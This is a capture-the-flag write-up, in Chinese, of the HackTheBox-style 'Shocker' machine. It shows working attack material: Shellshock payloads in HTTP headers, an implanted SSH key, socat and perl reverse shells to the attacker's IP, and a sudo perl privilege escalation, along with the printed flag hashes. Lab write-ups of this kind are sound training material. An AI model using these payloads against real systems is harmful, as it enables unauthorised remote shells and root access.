# Shocker

> victim: 10.10.10.56
>
> local: 10.10.14.19

简单扫描就一个80，看看吧

## 扫描结果分析

- Web(80)
  - 直接访问没啥东西，扫一扫吧
- SSH(2222)
  - 版本搜索了一下好像除了用户名枚举漏洞就没啥了，先不管了
  - ssh-hostkey好像太短了，才256位~~，有危险~~ 是我想多了，并不是

## Web服务分析

没有找到版本漏洞

直接访问没啥东西，扫一扫吧

```bash
gobuster dir -u http://10.10.10.56/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -s '200,204,301,302,307,403,500' -e > gobuster.txt
```

没有想法了，根据题解，要对cgi进行扫描，并且换用字典

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/   -w /usr/share/wordlists/dirb/small.txt   -s '200,204,301,302,307,403,500' -x cgi,sh,pl,py -e
```

```
http://10.10.10.56/cgi-bin/user.sh
```

只有一条，结合较低版本的ubuntu、题目名和cgi，考虑是shellshock

> 完成后补充，这个地方应该nikto能够检测到

### Shellshock利用

检测

```bash
locate nse|grep shellshock # 搜索相关nse
less /usr/share/nmap/scripts/http-shellshock.nse # 查看代码和使用示例

nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
```

但是检测失误，没有发现，根据walkthrough，是因为脚本中有一句和靶场环境不兼容

结合burpsuite分析进行修改，BurpSuite选择新的监听并增加转发位置，否则无法接收到直接发到这个监听的包，会报错

```bash
sudo cp /usr/share/nmap/scripts/http-shellshock.nse /usr/share/nmap/scripts/http-shellshock-modified-20-10-25.nse
```
第100行如下，引起服务器误解，产生400错误，将其注释
```
options["header"][cmd] = cmd
```
重新执行
```bash
nmap -sV -p80 --script http-shellshock-modified-20-10-25 --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
```

成功，可见shellshock可用

继续打开Burpsuite，将nse利用脚本发送到其中，进行进一步渗透

```bash
nmap -sV -p8081 --script http-shellshock-modified-20-10-25 --script-args uri=/cgi-bin/user.sh,cmd=ls localhost
```

原包

```
GET /cgi-bin/user.sh HTTP/1.1
Connection: close
Host: 10.10.10.56:80
User-Agent: () { :;}; echo; echo "kbtqdwbkudkqqpo"
Referer: () { :;}; echo; echo "kbtqdwbkudkqqpo"
Cookie: () { :;}; echo; echo "kbtqdwbkudkqqpo"


```

修改后(所有命令都需要绝对路径访问)

```
GET /cgi-bin/user.sh HTTP/1.1
Connection: close
Host: 10.10.10.56:80
User-Agent: () { :;}; echo; /bin/ls


```

## 获取Shell

获取到当前用户为shelly，对应shell为`/bin/bash`

### 尝试使用公钥

添加公钥以登录，下列指令均通过Burp进行，省略其他部分

```bash
#victim
/usr/bin/whoami
/usr/bin/mkdir ~/.ssh 
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3Tm0c6UmpYy9gFfVmTU4PRRuGw6p6p9/gs8IT2g0fFnx/e236NRkXbOhcmc5pajZ15YHvTfo6ao4/Nv6g6izJ/vOHaQFHVeesa4VRIVRrN6AWEqz292Tut+H3YihLQffzZXE/25f2Yed+DYEa3hCkHeq0hcTzC5pYFyOT5BYjNfUKNURgTLg8/fCetX8lSuBS2yidqmMVnysumJcp1C9ab853JP3qDvZq0CzGyMnxSujjMVtdw8v7BlAkbCELxwmK0xpdNFtrM0LTBLTwp9kqjCUez4E4PJVForGoi2vopVwFxZB4rQIx/W9kc+CV5Aum8vP0r5VyiUypidWG7QNuxIRy+HphH+E7VeuQlR20I6J7m0OnLrkj5+djTaUak/+XQwJA3RyntGoEA1o+fU6tveTnboPOBPCEVb4w4/G84183VOAkR7KbRpcxIhac8GuWcf0j1CMrbugMA88QnmZ/2pDlcmDVCBSVuC8mHz+gO7jKgfzu2FlpgbGNF2WOpuU= kano@kali' >> ~/.ssh/authorized_keys
/bin/cat ~/.ssh/authorized_keys
```

```bash
#local
ssh shelly@10.10.10.56 -i 56.id_rsa -p 2222
```

失败，还是用socat吧

### 尝试使用socat

```bash
#victim
/bin/uname -a 
# 获取到目标机为 x86_64
```

```bash
#local
sudo proxychains4 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /var/www/html/socat
sudo systemctl start apache2

socat file:`tty`,raw,echo=0 tcp-listen:4444
```

```bash
/usr/bin/wget http://10.10.14.19/socat -O /tmp/socat
/bin/chmod +x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.19:4444
```

成功获取shell

user.txt

```
2ec24e11320026d1e70ff3e16695b233
```

## Privilege Escalation

尝试LinEnum，用http传输过去

```
[+] We're a member of the (lxd) group - could possibly misuse these rights!
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

### 尝试LXD提权

> https://www.freebuf.com/articles/system/216803.html

```bash
lxc launch ubuntu:18.04 fal
```

所有lxc命令都报这个错误

```
error: mkdir /.config: permission denied
```

可能没法继续提权

### 其他方法

简单看了下`sudo -l`，发现可以执行perl，那显然可以提权了

```bash
#local
nc -lvvp 5555
```

```bash
sudo /usr/bin/perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.19:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

成功获得shell，但是这个shell显示效果很差，甚至提示符都没有，先利用它调整下ssh

先修补path

```bash
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

挺离谱的，cd都用不了，也没有.ssh目录

好像是perl shell的原因，再挂socat就稳了，完美shell get

root.txt

```
52c2715605d70c7619030560dc1ca467
```

